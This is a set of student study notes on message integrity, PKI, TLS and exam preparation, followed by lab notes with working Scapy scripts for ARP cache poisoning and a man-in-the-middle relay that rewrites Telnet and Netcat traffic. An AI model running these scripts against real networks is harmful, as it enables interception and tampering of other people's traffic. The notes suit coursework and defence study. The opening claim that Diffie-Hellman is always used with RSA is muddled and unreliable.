## Message Integrity, PKI, and TLS

### Diffie-Hellman

Always used with RSA because DH needs to be protected. It can't be used as plain text.

![[Screenshot 2025-05-16 at 10.21.37 AM.png]]

**I. Core Concepts & Definitions**

*   **Message Integrity:** Ensures data hasn't been altered in transit.
*   **Authentication:** Verifies the origin/identity of data or a user.
*   **Non-repudiation:** Prevents a sender from denying they sent a message.
*   **Confidentiality:** Ensures data is unreadable by unauthorized parties (encryption).
*   **Nonce:** "Number used once." A random or pseudo-random number issued in an authentication protocol to ensure that old communications cannot be reused in replay attacks.
*   **PFS (Perfect Forward Secrecy):** If a server's long-term private key is compromised, past session keys (and thus past encrypted traffic) are NOT compromised. Achieved using ephemeral key exchange methods (e.g., DHE, ECDHE).

**II. Message Integrity Mechanisms**

1.  **Hashing (Message Digest)**
    *   **Function:** Takes arbitrary-length message -> fixed-length string (digest).
    *   **Properties:**
        *   One-way (hard to reverse).
        *   Collision-resistant (hard to find two messages with the same hash).
    *   **Algorithms:**
        *   **MD5 (128-bit):** BROKEN, NOT collision-resistant. Do not use for security.
        *   **SHA-1 (160-bit):** WEAK/BROKEN, NOT collision-resistant. Deprecated.
        *   **SHA-2 (SHA-256, SHA-384, SHA-512):** Currently secure.
    *   **Use:** Integrity checks, component of digital signatures & HMAC.

2.  **HMAC (Hash-based Message Authentication Code)**
    *   **How it works:** `H( K XOR opad || H( K XOR ipad || message) )` (Don't need to memorize formula, understand concept).
    *   **Requires:** A shared secret key (K) between parties.
    *   **Provides:**
        *   **Integrity:** Message hasn't changed.
        *   **Authentication:** Message came from someone who knows the shared secret K.
    *   **Does NOT provide:** Confidentiality (message is not encrypted by HMAC itself).
    *   **Example:** `HMAC-SHA256`

3.  **Digital Signatures**
    *   **How Alice signs message M:**
        1.  Calculate `Hash(M)`.
        2.  Encrypt `Hash(M)` with **Alice's Private Key** => Signature.
        3.  Send `M + Signature`.
    *   **How Bob verifies:**
        1.  Decrypt Signature with **Alice's Public Key** => `Hash1`.
        2.  Calculate `Hash(M)` from the received message => `Hash2`.
        3.  If `Hash1 == Hash2`, signature is valid.
    *   **Provides:**
        *   **Integrity:** `Hash(M)` ensures M wasn't tampered.
        *   **Authentication:** Only Alice could encrypt with her private key.
        *   **Non-repudiation:** Alice cannot deny signing M.
    *   **Algorithms:** RSA, DSA, ECDSA.
    *   **Key Difference: HMAC vs. Digital Signature:**
        *   **HMAC:** Symmetric (shared secret key). For authentication between two parties who already trust each other enough to share a key.
        *   **Digital Signature:** Asymmetric (private/public key pair). For proving origin to anyone who has the public key and trusts its binding to the sender.

**III. PKI (Public Key Infrastructure)**

*   **Purpose:** Manage and distribute public keys and bind them to identities.
*   **Components:**
    *   **CA (Certificate Authority):** Trusted entity that issues and signs digital certificates.
        *   **Root CA:** Top-level, self-signed certificate. Must be implicitly trusted (e.g., pre-installed in browsers/OS).
        *   **Intermediate CA:** Issues certs to end-entities or other CAs. Signed by a Root CA or another Intermediate CA. Forms a "chain of trust".
    *   **RA (Registration Authority):** Verifies identity before CA issues cert (often part of CA).
    *   **Certificate Repository:** Stores issued certs.
    *   **CRL (Certificate Revocation List):** List of revoked certs.
    *   **OCSP (Online Certificate Status Protocol):** Real-time check for cert revocation. (OCSP Stapling: server periodically gets signed OCSP response from CA and sends it to client with cert).

*   **X.509 Certificate (v3 is standard):**
    *   **Key Fields:**
        *   **Version**
        *   **Serial Number** (unique per CA)
        *   **Signature Algorithm ID** (algo used by CA to sign *this* cert)
        *   **Issuer:** CA's distinguished name (DN).
        *   **Validity Period:** Not Before, Not After dates.
        *   **Subject:** Certificate owner's DN (e.g., `CN=www.example.com`).
        *   **Subject Public Key Info:** The public key itself and its algorithm.
        *   **Extensions:**
            *   **Basic Constraints:** `cA:TRUE` (this is a CA cert) or `cA:FALSE` (end-entity cert). Path length.
            *   **Key Usage:** e.g., digitalSignature, keyEncipherment.
            *   **Subject Alternative Name (SAN):** **Primary field for website identity.** Can list multiple hostnames (e.g., `example.com`, `www.example.com`, `mail.example.com`). *Supersedes CN for HTTPS.*
            *   **CRL Distribution Points:** URL where CRL can be found.
            *   **Authority Information Access (AIA):** URL for OCSP responder, URL for issuer's cert.
    *   **CA Digital Signature:** The CA signs the entire certificate (except this field) with its private key.

*   **Certificate Validation Process (e.g., Browser for HTTPS):**
    1.  **Chain of Trust:** Build path from end-entity cert to a trusted Root CA in the browser/OS store.
    2.  **Signature Verification:** For each cert in chain (except root), verify its signature using the public key of the *issuer* cert.
    3.  **Validity Period:** Check "Not Before" and "Not After" dates against current time.
    4.  **Revocation Status:** Check CRL or OCSP (often OCSP stapling is used; direct CRL checks by clients are rare and problematic).
    5.  **Name Matching:** For HTTPS, check if requested hostname matches a name in the SAN (or CN if SAN absent, but SAN is standard).
    6.  **Basic Constraints:** Ensure intermediate certs have `cA:TRUE`.
    7.  **Key Usage/Extended Key Usage:** Check if cert is authorized for its purpose (e.g., server authentication for TLS).

*   **Certificate Types (for web servers):**
    *   **DV (Domain Validated):** CA only verifies control over the domain name (e.g., email to admin@domain, DNS record). Weakest.
    *   **OV (Organization Validated):** CA verifies domain control + some vetting of the organization's existence.
    *   **EV (Extended Validated):** Strictest vetting of the organization. Browsers often show special UI (e.g., green bar, organization name). *Provides no stronger encryption than DV/OV.*

*   **Email (S/MIME) vs. Website (HTTPS) Certificate Validation:**
    *   **HTTPS:** Browsers have strict, automated validation: domain match (SAN/CN), chain to trusted root, revocation (ideally). Goal: Authenticate the *server/domain*.
    *   **S/MIME (Email):** Validates sender's *identity* based on email address in cert. Trust in CA is key. User often needs to manually trust sender's cert or its CA. Domain validation is not the primary goal as it is for HTTPS. Relies more on user discretion and MUA (Mail User Agent) configuration.

**IV. SSL/TLS (Secure Sockets Layer / Transport Layer Security)**
![[Screenshot 2025-05-16 at 12.01.56 PM.png]]
*   **Purpose:** Provide secure communication channel over TCP.
    *   Confidentiality (encryption), Integrity (MAC), Authentication (certs).
*   **Versions:** SSLv2 (broken), SSLv3 (broken), TLS 1.0 (old), TLS 1.1 (old), TLS 1.2 (common), **TLS 1.3 (current best)**.
*   **TLS Handshake (Simplified, TLS 1.2 & below):**
    1.  **ClientHello:**
        *   TLS version(s) supported.
        *   Client Random (32 bytes).
        *   Session ID (for resumption).
        *   List of Cipher Suites supported by client.
        *   Compression methods (usually NULL).
        *   Extensions (e.g., SNI, ALPN).
    2.  **ServerHello:**
        *   Chosen TLS version.
        *   Server Random (32 bytes).
        *   Chosen Session ID.
        *   Chosen Cipher Suite (from client's list).
        *   Chosen Compression method.
    3.  **Certificate (Server):** Server sends its X.509 certificate (and chain if needed).
    4.  **(Optional) ServerKeyExchange:**
        *   Needed for DHE/ECDHE. Contains ephemeral DH parameters signed by server's long-term certificate key (e.g., RSA private key).
        *   Not needed if RSA key exchange is used (server's public key from cert is used directly).
    5.  **(Optional) CertificateRequest:** Server requests client certificate (for mutual auth).
    6.  **ServerHelloDone:** Server is done with its part of negotiation.
    7.  **(Optional) Certificate (Client):** If server requested.
    8.  **ClientKeyExchange:**
        *   **RSA key exchange:** Client generates PreMasterSecret (PMS), encrypts with server's public key (from cert), sends it.
        *   **DHE/ECDHE:** Client sends its ephemeral DH public key. Both sides can now compute PMS.
    9.  **(Optional) CertificateVerify:** If client sent cert, client signs hash of previous handshake messages.
    10. **ChangeCipherSpec (Client):** Client signals it will now switch to encrypted messages.
    11. **Finished (Client):** ENCRYPTED. Hash of all preceding handshake messages. Verifies handshake integrity.
    12. **ChangeCipherSpec (Server):** Server signals switch.
    13. **Finished (Server):** ENCRYPTED. Hash of all preceding handshake messages (including client's Finished).
    *   *Master Secret is derived from PreMasterSecret, Client Random, Server Random.* Session keys are derived from Master Secret.

*   **TLS 1.3 Handshake Differences (Simplified):**
    *   Faster: Often 1-RTT. Client sends ClientHello with key share (its ephemeral DH public key) and guesses ciphersuite.
    *   Server can immediately send ServerHello, its key share, encrypted extensions, Certificate, Finished.
    *   Removes static RSA key exchange (PFS is mandatory).
    *   Removes weak/old ciphers.
    *   Encrypts more of the handshake.

*   **Cipher Suites (e.g., `TLS_DHE_RSA_WITH_AES_128_CBC_SHA`)**
    *   `TLS_`: Protocol.
    *   `DHE`: Key Exchange (Diffie-Hellman Ephemeral). Provides PFS.
    *   `RSA`: Authentication (Server's certificate uses RSA, signature on DHE params uses RSA).
    *   `AES_128_CBC`: Bulk Encryption (AES 128-bit, CBC mode).
    *   `SHA`: MAC/Hash algorithm (SHA-1 in this old example for integrity).
    *   **Modern Example:** `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384`
        *   `ECDHE`: Elliptic Curve DHE (PFS).
        *   `RSA`: Authentication.
        *   `AES_256_GCM`: AES 256-bit, Galois/Counter Mode (AEAD - Authenticated Encryption with Associated Data; provides both encryption and integrity).
        *   `SHA384`: Used for PRF (Pseudo-Random Function) in key derivation and handshake MAC. (GCM provides its own integrity).

*   **Perfect Forward Secrecy (PFS):**
    *   **Achieved with:** DHE, ECDHE (Ephemeral DH keys are generated per session).
    *   **NOT achieved with:** Static RSA key exchange (if server's RSA private key is stolen, all past sessions encrypted with it can be decrypted).
    *   `TLS_DH_RSA...` (no 'E') uses static DH parameters in server cert, no PFS.

*   **Record Layer Protocol:**
    1.  Fragments application data.
    2.  (Optional, RARELY USED, removed in TLS 1.3) Compresses.
    3.  Adds MAC (e.g., HMAC-SHA256) for integrity (HMAC-then-Encrypt for TLS < 1.3).
    4.  Encrypts (data + MAC) using symmetric session key.
    5.  Adds SSL/TLS Record Header.
    *   **TLS 1.3 uses AEAD ciphers (e.g., AES-GCM):** Encrypt-then-MAC principle is inherent.

*   **Key Vulnerabilities & Attacks:**
    *   **Weak/Broken Crypto:** MD5, SHA-1, RC4, DES, small RSA keys (<2048), SSLv2/v3.
    *   **Implementation Flaws:** Heartbleed (info leak), POODLE (padding oracle on SSLv3 CBC), BEAST/CRIME/BREACH (compression/CBC attacks).
    *   **Version Rollback:** Attacker forces client/server to use older, weaker TLS/SSL version. (Finished message helps prevent this if implemented correctly).
    *   **Ciphersuite Downgrade:** Attacker influences ciphersuite choice to a weaker one.
    *   **Certificate Issues:**
        *   Compromised CA private key (can sign any cert).
        *   Rogue CA / Mis-issued certs.
        *   Failure to check revocation.
        *   Ignoring browser warnings.
    *   **SSLStrip:** MITM attack. Attacker presents HTTP to client, HTTPS to server.
    *   **TCP RST vs. `close_notify`:** If connection ends with TCP RST without a preceding `close_notify` alert, it's an unclean shutdown, possibly an attack. TLS expects `close_notify`.

**V. Potential Exam Questions & How to Approach**

*   **"How would Alice generate a digital signature?"**
    *   Alice hashes message M, then encrypts hash with her *private key*. (Sample Q1a)
*   **"How can Trudy exploit [system with replay vulnerability]?"**
    *   Capture and resend valid signed message. (Sample Q1b)
*   **"How to prevent replay attack?"**
    *   Add a nonce (random number) to the message before signing/MACing. (Sample Q1c)
*   **"In SSL Full Handshake, what if Finished messages don't checksum previous handshake messages?"**
    *   Attacker (MITM) could modify handshake messages (e.g., ciphersuites, version) without detection, leading to version/cipher rollback. (Sample SSL/TLS Q1a)
*   **"Describe components of ciphersuite `TLS_XXX_YYY_WITH_ZZZ_AAA`."**
    *   XXX: Key Exchange (e.g., DHE, ECDHE, RSA). YYY: Authentication (e.g., RSA, ECDSA). ZZZ: Bulk Cipher (e.g., AES_128_CBC). AAA: MAC/Hash (e.g., SHA, SHA256). (Sample SSL/TLS Q1b)
*   **"Primary security difference between `TLS_DHE_...` and `TLS_DH_...` (or `TLS_RSA_...`)?"**
    *   PFS. `DHE` (Ephemeral) provides PFS, `DH` (static) or `RSA` key exchange do not. (Sample SSL/TLS Q1c)
*   **"What messages are hashed in Finished message?"**
    *   All previous handshake messages (ClientHello up to just before this Finished). (Sample SSL/TLS Q2a)
*   **"Why should ciphersuite X not be used?"**
    *   No PFS (e.g., uses RSA key exchange or static DH).
    *   Uses broken/weak crypto (e.g., RC4, SHA-1, MD5, DES). (Sample SSL/TLS Q2d, SSL/TLS Q3.2b)
*   **"If Amazon uses `TLS_RSA_...` and Trudy steals their private key, are prior connections protected?"**
    *   No, because RSA key exchange does not provide PFS. Trudy can decrypt all past sessions. (Sample PKI/TLS Q1a)
*   **"How can Trudy MITM with stolen private key?"**
    *   Impersonate Amazon.com. Browser won't show errors because Trudy has valid private key to complete handshake and decrypt/encrypt. (Sample PKI/TLS Q1b)
*   **"Is it possible for CA to issue multiple certs for amazon.com?"**
    *   Yes, CAs can issue multiple valid certs for the same domain (e.g., different key types, different expiry, different intermediate CAs). (Sample PKI/TLS Q1c)
*   **"Root CA vulnerable to Heartbleed (lost private key). What can user do?"**
    *   Remove compromised Root CA from trusted store. Avoid sites whose certs chain to it (hard). Change passwords if sites were MITM'd. (Sample PKI/TLS Q1d)
*   **"How does TLS ensure different ciphertext for same plaintext message (using CBC)?"**
    *   CBC mode uses a unique IV (Initialization Vector) for each message/record. (Sample SSL/TLS Q3.1b)
*   **TRUE/FALSE style questions (see sample finals for examples):**
    *   TLS compression (generally not used due to attacks).
    *   Stateless vs. Stateful firewalls (stateless usually faster, often hardware).
    *   Who chooses ciphersuite in TLS? (Server chooses from client's list).
    *   DHCP server looks at CHADDR (client MAC in DHCP packet), not Ethernet header MAC directly for assignment logic.
*   **"What field in X.509 determines websites cert can be used for?"**
    *   Subject Alternative Name (SAN). Fallback to Common Name (CN).
*   **"What field in X.509 specifies if cert is CA or End-Entity?"**
    *   Basic Constraints: `cA` flag.
*   **"What is a CRL?"**
    *   A list of certificates revoked by the issuing CA before their scheduled expiry.
*   **"In server cert, Issuer CN is same as what field in Intermediate CA's cert?"**
    *   Subject CN of the Intermediate CA.

## Firewalls

## Layer 2 Security

## Wireless Security

## Lab 3

**I. Core ARP Concepts**

*   **ARP (Address Resolution Protocol):** Maps IP addresses to MAC addresses on a local network.
*   **ARP Request:** Broadcast. "Who has IP `target_IP`? Tell `sender_IP`."
    *   Ethernet Dst: `ff:ff:ff:ff:ff:ff`
    *   ARP Opcode: `1` (request)
    *   ARP `psrc`: `sender_IP`, `hwsrc`: `sender_MAC`
    *   ARP `pdst`: `target_IP`, `hwdst`: `00:00:00:00:00:00` (or `ff:ff:ff:ff:ff:ff` for Gratuitous)
*   **ARP Reply:** Unicast (usually). "`target_IP` is at `target_MAC`."
    *   Ethernet Dst: `requester_MAC`
    *   ARP Opcode: `2` (reply)
    *   ARP `psrc`: `target_IP`, `hwsrc`: `target_MAC` (this is what the victim caches)
    *   ARP `pdst`: `sender_IP`, `hwdst`: `sender_MAC`
*   **ARP Cache:** Temporary storage on hosts for IP-MAC mappings.
    *   Check: `arp -n` (Linux)
    *   Delete entry: `arp -d <IP_ADDRESS>`
*   **Gratuitous ARP:** A host sends an ARP packet (often a request, sometimes a reply) about its *own* IP address, not in response to a request.
    *   **Purpose:** Update ARP caches of other hosts (e.g., after IP change), detect IP conflicts.
    *   **For Poisoning (Task 1.C - Gratuitous ARP Request):**
        *   ARP `psrc` (Sender IP) = ARP `pdst` (Target IP) = IP being claimed.
        *   ARP `hwsrc` (Sender MAC) = Attacker's MAC.
        *   Ethernet Dst = `ff:ff:ff:ff:ff:ff` (Broadcast).
        *   ARP `hwdst` = `ff:ff:ff:ff:ff:ff` (Broadcast in lab spec).

**II. ARP Poisoning Techniques (Scapy Examples)**

*   **Victim:** Host A (`IP_A`, `MAC_A`)
*   **Target of Impersonation:** Host B (`IP_B`, `MAC_B`)
*   **Attacker:** Host M (`IP_M`, `MAC_M`)

1.  **Task 1.A: ARP Request Attack** (Poison A's cache: `IP_B` is at `MAC_M`)
    ```python
    # On Host M, send to Host A
    # Tell A that IP_B (psrc) is at MAC_M (hwsrc), by asking A (pdst) about itself
    arp_pkt = Ether(src=MAC_M, dst=MAC_A) / \
              ARP(op=1, # Request
                  hwsrc=MAC_M, psrc=IP_B,  # Spoofed Sender (M claims to be B)
                  hwdst="00:00:00:00:00:00", pdst=IP_A) # Actual Target of ARP query
    sendp(arp_pkt, iface="eth0", verbose=False)
    ```
    *Key Idea:* A receives an ARP request seemingly from `IP_B` (but with `MAC_M`). Some OSes might cache `IP_B -> MAC_M` from the `psrc`/`hwsrc` of the request.

2.  **Task 1.B: ARP Reply Attack** (Poison A's cache: `IP_B` is at `MAC_M`)
    ```python
    # On Host M, send to Host A
    # Tell A (pdst, hwdst) that IP_B (psrc) is at MAC_M (hwsrc)
    arp_pkt = Ether(src=MAC_M, dst=MAC_A) / \
              ARP(op=2, # Reply
                  hwsrc=MAC_M, psrc=IP_B,    # The poisoned mapping
                  hwdst=MAC_A, pdst=IP_A)    # Destination of this reply
    sendp(arp_pkt, iface="eth0", verbose=False)
    ```
    *Key Idea:* Send an unsolicited ARP reply to A.

3.  **Task 1.C: Gratuitous ARP Request Attack** (Poison A's cache: `IP_B` is at `MAC_M`)
    ```python
    # On Host M, send as broadcast
    # Announce that IP_B (psrc, pdst) is at MAC_M (hwsrc)
    BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
    arp_pkt = Ether(src=MAC_M, dst=BROADCAST_MAC) / \
              ARP(op=1, # Request
                  hwsrc=MAC_M, psrc=IP_B,        # Announce IP_B is at MAC_M
                  hwdst=BROADCAST_MAC, pdst=IP_B) # Target IP is also IP_B
    sendp(arp_pkt, iface="eth0", verbose=False)
    ```
    *Key Idea:* Broadcast an ARP request where sender IP and target IP are the IP address being advertised (`IP_B`), with attacker's MAC (`MAC_M`).


**III. Man-in-the-Middle (MITM) Attack**

1.  **Setup:**
    *   **Poison A:** Convince A that `IP_B` is at `MAC_M`.
    *   **Poison B:** Convince B that `IP_A` is at `MAC_M`.
        *   Use ARP Reply attacks (like Task 1.B, but targeted appropriately for each victim).
        *   Run `poison_a.py` and `poison_b.py` continuously in background:
            `while true; do sudo python3 poison_script.py; sleep 2; done`
    *   **IP Forwarding on Attacker (M):**
        *   `sudo sysctl net.ipv4.ip_forward=1` (Enable: to establish initial connection)
        *   `sudo sysctl net.ipv4.ip_forward=0` (Disable: to let Scapy script intercept & modify)

![[Screenshot 2025-05-16 at 9.51.24 AM.png]]

2.  **Scapy Sniff-and-Spoof (Skeleton for `mitm_telnet.py` / `mitm_netcat.py`):**
    ```python
    from scapy.all import *

    # IP_A, MAC_A, IP_B, MAC_B, MAC_M defined
    # For Netcat: student_id_bytes, replacement_bytes defined

    def spoof_pkt(pkt):
        if IP in pkt and TCP in pkt:
            # Packet from A to B (Client -> Server)
            if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
                newpkt_ip = IP(bytes(pkt[IP])) # Copy L3+
                del(newpkt_ip.chksum)
                del(newpkt_ip[TCP].chksum)
                
                if pkt[TCP].payload:
                    data = pkt[TCP].payload.load
                    # --- MODIFICATION LOGIC ---
                    # Telnet: newdata = data.replace(b'Q', b'Z')
                    # Netcat: newdata = data.replace(student_id_bytes, replacement_bytes)
                    # --------------------------
                    if TCP in newpkt_ip and Raw in newpkt_ip[TCP]: # Clear old payload
                        del(newpkt_ip[TCP].payload)
                    sendp(Ether(src=MAC_M, dst=MAC_B)/newpkt_ip/newdata, iface="eth0", verbose=False)
                else: # No payload
                    sendp(Ether(src=MAC_M, dst=MAC_B)/newpkt_ip, iface="eth0", verbose=False)
            
            # Packet from B to A (Server -> Client - usually just forward)
            elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
                newpkt_ip = IP(bytes(pkt[IP]))
                del(newpkt_ip.chksum)
                del(newpkt_ip[TCP].chksum)
                # No payload modification for B->A in this lab
                sendp(Ether(src=MAC_M, dst=MAC_A)/newpkt_ip, iface="eth0", verbose=False)

    # Filter for Telnet: f = f"tcp and port 23 and ((src host {IP_A} and dst host {IP_B}) or (src host {IP_B} and dst host {IP_A}))"
    # Filter for Netcat: f = f"tcp and port 9090 and ..." (similar structure)
    sniff(iface="eth0", filter=f, prn=spoof_pkt, store=0)
    ```

**IV. Key Tools & Commands**

*   **Scapy:** Python library for packet manipulation.
    *   `Ether()`, `ARP()`, `IP()`, `TCP()`, `Raw()` (for payload)
    *   `/` operator to stack layers.
    *   `sendp()`: Send packet at Layer 2 (needs full Ethernet frame).
    *   `sniff()`: Capture packets.
*   **Wireshark:** Packet analyzer.
    *   Capture on `br-xxxx` (host bridge interface).
    *   Display filters (e.g., `arp`, `tcp.port == 23`, `ip.addr == x.x.x.x`).
*   `telnet <IP>`
*   `nc <IP> <PORT>` (client)
*   `nc -lp <PORT>` (server)

## Lab 4

## TLS HW3